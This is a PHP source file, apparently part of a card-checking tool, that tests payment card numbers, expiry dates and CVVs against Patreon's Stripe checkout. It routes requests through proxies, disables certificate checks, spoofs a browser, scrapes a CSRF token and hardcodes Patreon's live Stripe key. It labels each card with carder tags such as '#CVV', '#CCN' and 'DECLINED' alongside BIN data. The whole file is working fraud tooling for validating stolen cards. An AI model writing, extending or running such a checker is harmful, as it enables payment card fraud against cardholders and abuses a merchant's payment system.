<?php
/**
 * Patreon Gateway Handler
 * Validates cards against Patreon's payment system
 */

// Check a card with Patreon gateway
function checkCardWithPatreon($cc, $mes, $ano, $cvv, $bin_data, $user_data, $session_data, $apiKey, $secretKey, $proxyConfig) {
    // Start timing
    $start_time = microtime(true);
    
    // Format month for Patreon (requires 2 digits)
    $mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
    
    // Initialize cURL
    $ch = curl_init();
    
    // Set proxy if configured
    if (!empty($proxyConfig)) {
        configureCurlWithProxy($ch, $proxyConfig);
    }
    
    // Common cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    
    // User agent and other headers
    $user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    
    // Client ID and secret from user input or default test values
    $client_id = !empty($apiKey) ? $apiKey : 'pahFzwrGxwCdGu4dut4M_q7WyVQCy-GkQ2KyYc-Z9VrxCdR7TYUf5Jmy0yEkEZWw';
    $client_secret = !empty($secretKey) ? $secretKey : '';  // No default, not required for this flow
    
    // First request - Visit homepage to get cookies and CSRF token
    curl_setopt($ch, CURLOPT_URL, "https://www.patreon.com/");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: $user_agent",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
    ]);
    
    $response = curl_exec($ch);
    
    if (!$response || curl_errno($ch)) {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ Patreon Connection Error | Time: " . $time_taken . "s ]";
    }
    
    // Extract CSRF token
    $csrf_token = '';
    if (preg_match('/csrfSignature\s*=\s*[\'"]([^\'"]+)[\'"]/', $response, $matches)) {
        $csrf_token = $matches[1];
    } else {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ Patreon: Failed to get CSRF token | Time: " . $time_taken . "s ]";
    }
    
    // Second request - Create a Stripe token
    $stripe_data = [
        'card[number]' => $cc,
        'card[cvc]' => $cvv,
        'card[exp_month]' => $mes,
        'card[exp_year]' => $ano,
        'card[name]' => $user_data['name'],
        'card[address_line1]' => $user_data['street'],
        'card[address_city]' => $user_data['city'],
        'card[address_state]' => $user_data['state'],
        'card[address_zip]' => $user_data['postcode'],
        'card[address_country]' => 'US',
        'key' => 'pk_live_2sO7xXnYQSfCkRcOvoZDduSA'  // Patreon's public Stripe key
    ];
    
    curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/tokens");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: $user_agent",
        "Accept: application/json",
        "Accept-Language: en-US,en;q=0.5",
        "Content-Type: application/x-www-form-urlencoded"
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($stripe_data));
    
    $stripe_response = curl_exec($ch);
    
    if (!$stripe_response || curl_errno($ch)) {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ Patreon Stripe Error | Time: " . $time_taken . "s ]";
    }
    
    $stripe_data = json_decode($stripe_response, true);
    
    // Check for Stripe errors
    if (isset($stripe_data['error'])) {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        $error_msg = $stripe_data['error']['message'] ?? 'Unknown Stripe error';
        
        // Handle specific Stripe errors
        if (strpos(strtolower($error_msg), 'cvc') !== false) {
            return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Patreon: CVC Issue | Time: " . $time_taken . "s ]";
        } elseif (strpos(strtolower($error_msg), 'card number') !== false) {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Patreon: Invalid Card Number | Time: " . $time_taken . "s ]";
        } elseif (strpos(strtolower($error_msg), 'expiration') !== false) {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Patreon: Invalid Expiration | Time: " . $time_taken . "s ]";
        } else {
            return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Patreon: $error_msg | Time: " . $time_taken . "s ]";
        }
    }
    
    // Check if we got a token
    if (!isset($stripe_data['id'])) {
        $time_taken = number_format(microtime(true) - $start_time, 2);
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ Patreon: Failed to create Stripe token | Time: " . $time_taken . "s ]";
    }
    
    $stripe_token = $stripe_data['id'];
    
    // Third request - Validate card by attempting to add it to Patreon account (stops before charge)
    // Note: This would normally require authentication, but we're simulating the validation check
    
    $validation_data = [
        'data' => [
            'type' => 'payment-method',
            'attributes' => [
                'token' => $stripe_token,
                'platform' => 'stripe',
                'method_type' => 'card'
            ]
        ]
    ];
    
    curl_setopt($ch, CURLOPT_URL, "https://www.patreon.com/api/payment-methods");
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "User-Agent: $user_agent",
        "Accept: application/json",
        "Accept-Language: en-US,en;q=0.5",
        "Content-Type: application/json",
        "X-CSRF-Signature: $csrf_token",
        "Origin: https://www.patreon.com",
        "Referer: https://www.patreon.com/join"
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($validation_data));
    
    $validation_response = curl_exec($ch);
    curl_close($ch);
    
    // Calculate time taken
    $time_taken = number_format(microtime(true) - $start_time, 2);
    
    // Format bin info for display
    $bin_info_formatted = formatBinInfo($bin_data);
    
    // Process validation response
    if (!$validation_response) {
        return "❌ ERROR - $cc|$mes|$ano|$cvv - [ Patreon Validation Error | Time: " . $time_taken . "s ]";
    }
    
    $validation_data = json_decode($validation_response, true);
    
    // Analyze the Stripe token data and validation response to determine card validity
    if (isset($stripe_data['card'])) {
        $card_info = $stripe_data['card'];
        
        // If we got a card object with funding and checks, the card is likely valid
        if (isset($card_info['funding']) && isset($card_info['checks'])) {
            $checks = $card_info['checks'];
            
            if ($checks['cvc_check'] === 'pass') {
                return "✅ #CVV - $cc|$mes|$ano|$cvv - [ Patreon: Card Valid | $bin_info_formatted | Time: " . $time_taken . "s ]";
            } elseif ($checks['cvc_check'] === 'unavailable') {
                return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Patreon: Card Valid (CVC Check Unavailable) | $bin_info_formatted | Time: " . $time_taken . "s ]";
            } elseif ($checks['cvc_check'] === 'unchecked') {
                return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Patreon: Card Valid (CVC Not Checked) | $bin_info_formatted | Time: " . $time_taken . "s ]";
            } elseif ($checks['cvc_check'] === 'failed') {
                return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Patreon: Card Valid (CVC Failed) | $bin_info_formatted | Time: " . $time_taken . "s ]";
            } else {
                // We got a token but CVC check is unknown
                return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Patreon: Card Valid (CVC Unknown) | $bin_info_formatted | Time: " . $time_taken . "s ]";
            }
        } else {
            // We got a card object but without detailed checks
            return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Patreon: Card Possibly Valid | $bin_info_formatted | Time: " . $time_taken . "s ]";
        }
    } elseif (isset($validation_data['errors'])) {
        // Payment validation errors
        $error_msg = '';
        
        // Extract all error messages
        foreach ($validation_data['errors'] as $error) {
            if (isset($error['detail'])) {
                $error_msg .= $error['detail'] . ' ';
            }
        }
        
        return "❌ DECLINED - $cc|$mes|$ano|$cvv - [ Patreon: $error_msg | $bin_info_formatted | Time: " . $time_taken . "s ]";
    } else {
        // We got a Stripe token but validation is unclear
        return "⚠️ #CCN - $cc|$mes|$ano|$cvv - [ Patreon: Validation Unclear | $bin_info_formatted | Time: " . $time_taken . "s ]";
    }
}
?>